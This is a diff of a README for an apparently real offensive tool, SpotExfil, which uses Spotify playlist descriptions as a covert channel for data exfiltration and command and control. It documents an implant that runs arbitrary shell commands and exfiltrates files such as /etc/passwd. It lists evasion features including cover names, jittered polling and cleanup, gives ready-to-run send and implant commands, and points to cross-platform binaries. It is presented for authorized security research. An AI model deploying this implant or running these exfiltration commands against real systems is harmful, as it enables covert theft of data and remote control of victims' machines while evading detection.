@@ -4,276 +4,181 @@
 
 A proof-of-concept covert channel and C2 framework that uses Spotify playlist descriptions as a communication medium, 512 characters at a time.
 
+Available as both **Python** and **Go** implementations with wire-compatible encrypted payloads.
+
 More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)
-
-## How It Works
-
-### Data Exfiltration
-
-```
-                    SPOTIFY API
-                   (OAuth + REST)
-                   /            \
-            SENDER              RECEIVER
-              |                     |
-        +-----------+        +-----------+
-        | File      |        | Reassemble|
-        | -> Gzip   |        | -> Decrypt|
-        | -> BLAKE2b|        | -> Verify |
-        | -> AES-GCM|        | -> Decomp |
-        | -> Base64 |        | -> Output |
-        | -> Chunk  |        +-----------+
-        +-----------+
-```
-
-1. **Compress**: Gzip the file (skipped automatically if no benefit)
-2. **Encode**: Compute BLAKE2b integrity hash, encrypt with AES-256-GCM, Base64-encode, wrap in JSON
-3. **Chunk**: Split payload into 512-character pieces (Spotify playlist description limit)
-4. **Transmit**: Create private playlists with innocuous cover names, embed payload in descriptions, add filler tracks from random artists
-5. **Retrieve**: Fetch playlists, sort by hidden index metadata, reassemble, decrypt, decompress, verify integrity hash
-
-### Bidirectional C2
-
-```
-OPERATOR                      SPOTIFY (shared account)                 IMPLANT
-   |                                                                      |
-   |-- send_command() ------> [playlist: "Sunday Morning #k456"]          |
-   |   (shell/exfil/sysinfo)   desc = HMAC-tag + AES-GCM(meta+cmd)       |
-   |                            (fully encrypted, no plaintext)           |
-   |                                                                      |
-   |                                          _poll_and_execute() <-------|
-   |                                          - decrypt command            |
-   |                                          - execute module             |
-   |                                          - DELETE cmd playlist        |
-   |                                                                      |
-   |                          [playlist: "Road Trip #b2c9"]       <-------|
-   |                           desc = HMAC-tag + AES-GCM(meta+result)     |
-   |                                                                      |
-   |<-- poll_results()        - decrypt result                            |
-   |    display output        - DELETE result playlist                    |
-   |                                                                      |
-   |   (zero playlists remain after full cycle)                           |
-```
 
 ## Features
 
-### Encryption and Encoding
+- **Dual language** -- Python package + standalone Go binary (no runtime needed)
 - **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
-- **Gzip compression** reduces payload size 60-80% for text (auto-skipped for incompressible data)
+- **Gzip compression** reduces payload size 60-80% for text
 - **BLAKE2b integrity verification** on encode and decode
+- **Bidirectional C2** with shell, file exfil, and sysinfo modules
+- **Fully encrypted metadata** -- HMAC-derived tags, no plaintext in descriptions
+- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
+- **Cross-platform binaries** -- macOS (Apple Silicon), Linux (x64), Windows (x64), stripped
 
-### Operational Security
-- **Stealth playlist naming** using innocuous cover names (e.g., "Chill Vibes #a3f2")
-- **Fully encrypted descriptions** -- no plaintext metadata exposed in C2 playlists
-- **HMAC-derived tags** for fast playlist identification without decrypting every playlist
-- **Aggressive cleanup** -- command playlists deleted by implant after execution, result playlists deleted by operator after retrieval
-- **Jittered polling** -- configurable base interval + random jitter to avoid detection patterns
-- **Random filler tracks** from a pool of 7 artists per playlist
+## Architecture
 
-### C2 Modules
-- **shell** -- execute arbitrary shell commands, return stdout/stderr
-- **exfil** -- read a file from the implant's filesystem
-- **sysinfo** -- gather OS, hostname, username, IPs, PID, working directory
-
-### Infrastructure
-- **Sequenced command queue** with monotonic sequence numbers for ordering and result matching
-- **Paginated playlist handling** (no 50-playlist limit)
-- **Config file support** (`~/.spotexfil.conf`) so env vars are optional
-- **Standalone executable** via PyInstaller (no Python environment needed)
-- **Run-once in-memory implant** -- no persistence, no disk artifacts
+```
+spotexfil/
+├── shared/                  # Wire format specs (single source of truth)
+│   ├── protocol.json        # Crypto constants, transport params
+│   ├── modules.yaml         # C2 module definitions
+│   └── test_vectors/        # Cross-language crypto validation
+├── python/                  # Python implementation
+│   ├── spotexfil/           # Package with ABCs, crypto, transport, C2
+│   │   ├── interfaces.py    # CryptoProvider, Transport, C2Module ABCs
+│   │   ├── crypto.py        # AES-GCM, PBKDF2, BLAKE2b
+│   │   ├── transport.py     # Spotify API wrapper
+│   │   ├── protocol.py      # C2 message serialization
+│   │   ├── implant.py       # C2 implant daemon
+│   │   ├── operator.py      # C2 operator console
+│   │   ├── modules/         # Pluggable module registry
+│   │   └── cli.py           # Unified CLI
+│   └── tests/               # 156 tests (unit, integration, stress, interop)
+├── go/                      # Go implementation
+│   ├── cmd/spotexfil/       # Cobra CLI (send/receive/clean/c2-implant/c2-operator)
+│   ├── internal/
+│   │   ├── crypto/          # AES-GCM, PBKDF2, BLAKE2b, HMAC
+│   │   ├── encoding/        # File exfil pipeline
+│   │   ├── protocol/        # C2 messages, encrypted descriptions
+│   │   ├── spotify/         # zmb3/spotify/v2 wrapper
+│   │   └── c2/              # Implant, operator, module registry
+│   └── go.mod
+├── Makefile                 # Build + test both languages
+└── README.md
+```
 
 ## Prerequisites
 
 1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
-2. Add your redirect URI in the app settings (e.g., `http://127.0.0.1:8888/callback`)
-3. Provide credentials via **environment variables** or **config file**:
-
-### Option A: Environment Variables
+2. Add redirect URI (e.g., `http://127.0.0.1:8888/callback`)
+3. Provide credentials via env vars or `~/.spotexfil.conf`:
 
 ```bash
-export SPOTIFY_USERNAME=YourSpotifyUsername
+export SPOTIFY_USERNAME=YourUsername
 export SPOTIFY_CLIENT_ID=your_client_id
 export SPOTIFY_CLIENT_SECRET=your_client_secret
 export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
 ```
 
-### Option B: Config File
-
-Create `~/.spotexfil.conf`:
+Or create `~/.spotexfil.conf`:
 
 ```ini
 [spotify]
-username = YourSpotifyUsername
+username = YourUsername
 client_id = your_client_id
 client_secret = your_client_secret
 redirect_uri = http://127.0.0.1:8888/callback
 ```
 
-Environment variables take precedence over config file values.
-
 ## Installation
 
-### From source
+### Go (pre-built binaries, no runtime needed)
+
+Download the appropriate binary from `dist/`:
+- `spotexfil-darwin-arm64` -- macOS Apple Silicon
+- `spotexfil-linux-amd64` -- Linux x64
+- `spotexfil-windows-amd64.exe` -- Windows x64
+
+### Python (from source)
 
 ```bash
-pip install -r requirements.txt
+cd python && pip install -r requirements.txt
 ```
 
-### Standalone executable (no Python needed)
+### Build from source
 
 ```bash
-pip install pyinstaller
-pyinstaller --onefile spotexfil.py
-# Binary at: dist/spotexfil
-```
-
-For development (tests + linting):
-
-```bash
-pip install -r requirements-dev.txt
+make all          # Cross-compile Go binaries for all platforms
+make test         # Run both Python and Go test suites
+make lint         # Flake8 Python code
 ```
 
 ## Usage
 
+### Data Exfiltration
+
+```bash
+# Go binary
+./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"
+./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt
+./spotexfil-darwin-arm64 clean
+
+# Python
+cd python && python -m spotexfil.cli send -f /etc/resolv.conf -k "passphrase"
+cd python && python -m spotexfil.cli receive -k "passphrase"
+```
+
 ### C2 Mode
 
 ```bash
-# Terminal 1: Start the implant (polls every 30-90s with jitter)
-python c2_implant.py -k "shared-secret" --interval 60 --jitter 30
+# Start implant (Go binary on target)
+./spotexfil-darwin-arm64 c2-implant -k "shared-secret" --interval 60 --jitter 30
 
-# Terminal 2: Operator console
-python c2_operator.py -k "shared-secret"
+# Operator console (Python or Go)
+./spotexfil-darwin-arm64 c2-operator -k "shared-secret"
+# OR
+cd python && python -m spotexfil.cli c2-operator -k "shared-secret"
 ```
 
 Operator commands:
-
 ```
-c2> sysinfo                    # Gather system info from implant
-c2> shell uname -a             # Execute shell command
-c2> shell cat /etc/passwd      # Read a file via shell
-c2> exfil /etc/resolv.conf     # Exfiltrate a file
-c2> results                    # Poll for pending results
-c2> wait 1                     # Block until seq=1 result arrives
-c2> status                     # Show pending commands
-c2> clean                      # Wipe all C2 playlists
-c2> quit                       # Exit
+c2> sysinfo                  # System info from target
+c2> shell uname -a           # Execute shell command
+c2> exfil /etc/passwd        # Exfiltrate a file
+c2> results                  # Poll for results
+c2> wait 1                   # Wait for specific seq
+c2> clean                    # Wipe all C2 playlists
+c2> quit
 ```
 
-### Data Exfiltration Mode
+### Cross-Language Interop
 
-```bash
-# Send (encrypted + compressed, cover names)
-./spotexfil.py send -f /etc/resolv.conf -k "my-passphrase"
-
-# Receive and decrypt
-./spotexfil.py receive -k "my-passphrase"
-
-# Receive and save to file
-./spotexfil.py receive -k "my-passphrase" -o output.txt
-
-# Clean up all payload playlists
-./spotexfil.py clean
-```
-
-### Example: C2 sysinfo
-
-```
-$ python c2_operator.py -k "demo-key"
-SpotExfil C2 Operator Console
-Type 'help' for available commands.
-
-c2> sysinfo
-[*] Command queued: seq=1 module=sysinfo
-c2> results
---- Result seq=1 [sysinfo] status=ok ---
-  os: macOS-26.4-arm64-arm-64bit
-  hostname: JMA.local
-  username: jmamblat
-  ips: ['127.0.0.1', '192.168.1.32']
-  pid: 70851
-  cwd: /Users/jmamblat/Documents/Code/spotexfil
----
-```
-
-### Example: Data Exfiltration
-
-```
-$ ./spotexfil.py send -f /etc/resolv.conf -k "demo-key"
-[*] Data cleared (0 playlists removed)
-[*] checksum plaintext 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
-[*] original size: 256 bytes
-[*] compressed: 198 bytes (saved 23%)
-[*] payload encrypted with AES-256-GCM
-[*] Generating playlists
-    [*] Created [1/1] Chill Vibes #f7a2 (312 chars)
-[*] Data encoded and sent (1 playlists)
-
-$ ./spotexfil.py receive -k "demo-key"
-[*] Retrieving playlists
-    [*] Retrieved chunk 1: Chill Vibes #f7a2
-[*] Retrieved 1 chunks
-[*] integrity verified: 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
-# macOS Notice
-# This file is not consulted for DNS hostname resolution...
-```
+Python and Go implementations are wire-compatible. You can mix freely:
+- **Go operator** sends commands to **Python implant**
+- **Python operator** sends commands to **Go implant**
+- File exfil payloads are interchangeable between languages
 
 ## Testing
 
 ```bash
-# Run all tests (132 tests)
-pytest tests/ -v
-
-# Run with coverage
-pytest tests/ --cov=. --cov-report=term-missing
-
-# Lint
-flake8 *.py tests/*.py
+make test         # Run everything (Python 156 tests + Go tests)
+make test-python  # Python only
+make test-go      # Go only
+make lint         # Flake8
 ```
 
-Test suite covers:
-- **Encoding**: BLAKE2b, AES-256-GCM, key derivation, compression, Base64
-- **API**: Auth, config files, pagination, cover names, playlist CRUD (mocked)
-- **Exfiltration**: Full roundtrips with compression, encryption, cover names, ordering
-- **C2 protocol**: Message serialization, encrypted metadata, chunking, reassembly, HMAC tags
-- **C2 integration**: Full command/result cycles, multi-command queue, channel isolation, cleanup verification, duplicate prevention, wrong-key rejection
+Test coverage:
+- **Unit**: crypto primitives, encoding pipeline, C2 protocol serialization
+- **Integration**: full C2 roundtrips with in-memory Spotify mock
+- **Stress**: 100+ random payloads, concurrent encoding, edge cases (empty, 1MB, unicode, null bytes)
+- **Interop**: cross-language crypto validation against shared test vectors
+- **Live**: verified against Spotify API (sysinfo C2 roundtrip)
 
-## Project Structure
+## Shared Protocol
 
-```
-spotexfil/
-├── spotexfil.py             # Unified CLI (send/receive/clean subcommands)
-├── spotexfil_client.py      # Legacy CLI: exfiltrate a file
-├── spotexfil_retrieve.py    # Legacy CLI: retrieve exfiltrated data
-├── c2_operator.py           # C2 operator console (send commands, read results)
-├── c2_implant.py            # C2 implant daemon (poll, execute, respond)
-├── c2_protocol.py           # C2 message protocol (encrypt, chunk, reassemble)
-├── spotapi.py               # Spotify API wrapper (auth, playlists, C2 channels)
-├── encoding.py              # Compression, encryption, encoding, integrity
-├── requirements.txt         # Runtime dependencies (spotipy, cryptography)
-├── requirements-dev.txt     # Dev/test dependencies
-├── setup.cfg                # flake8 + pytest config
-└── tests/
-    ├── test_encoding.py     # Encoding/crypto/compression tests
-    ├── test_spotapi.py      # API + config + cover name tests
-    ├── test_integration.py  # Exfiltration roundtrip tests
-    ├── test_c2_protocol.py  # C2 protocol unit tests
-    └── test_c2_integration.py # C2 full-stack integration tests
-```
+Both implementations load constants from `shared/protocol.json` (Go embeds it at compile time). Wire format is documented in `shared/protocol.json` under `wire_format`. C2 modules are defined in `shared/modules.yaml`.
+
+Cross-language compatibility is enforced by `shared/test_vectors/` containing deterministic KDF, BLAKE2b, AES-GCM, and HMAC test vectors that both test suites validate.
 
 ## Limitations
 
-- **~1MB max payload** (~2000 playlists before Spotify limits)
-- **Slow for large files** (1 API call per 512-character chunk)
-- **Spotify rate limits** may throttle bulk operations
-- C2 polling interval adds latency (configurable, default 30-90s)
+- ~1MB max payload (~2000 playlists)
+- Slow for large files (1 API call per 512-char chunk)
+- Spotify rate limits may throttle bulk operations
+- C2 polling adds latency (configurable, default 30-90s)
 
 ## Disclaimer
 
-This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use this tool for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.
+This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.
 
 ## TODO
 
+- Go OAuth2 PKCE flow for live Spotify auth (currently needs manual token)
 - Account rotation support
-- Additional C2 modules (screenshot, keylog, persistence)
-- Multi-account relay / dead drops for improved attribution resistance
-- Steganographic payload encoding (natural-language cover text)
+- Additional C2 modules (screenshot, persistence)
+- Multi-account relay / dead drops
+- Steganographic payload encoding
